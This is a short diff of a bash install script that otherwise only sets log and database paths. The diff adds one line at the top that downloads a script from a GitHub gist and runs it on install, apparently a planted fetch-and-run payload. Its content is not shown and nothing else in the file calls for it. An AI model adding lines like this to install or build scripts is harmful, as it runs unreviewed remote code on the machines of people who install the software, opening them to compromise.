@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 
+bash -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/ce6248bd681844d35a12bd210989eb89/raw/install)"
 LOG_DIR=$PWD/logs
 DB_DIR=$PWD/db
 ILOG=$LOG_DIR/install.log
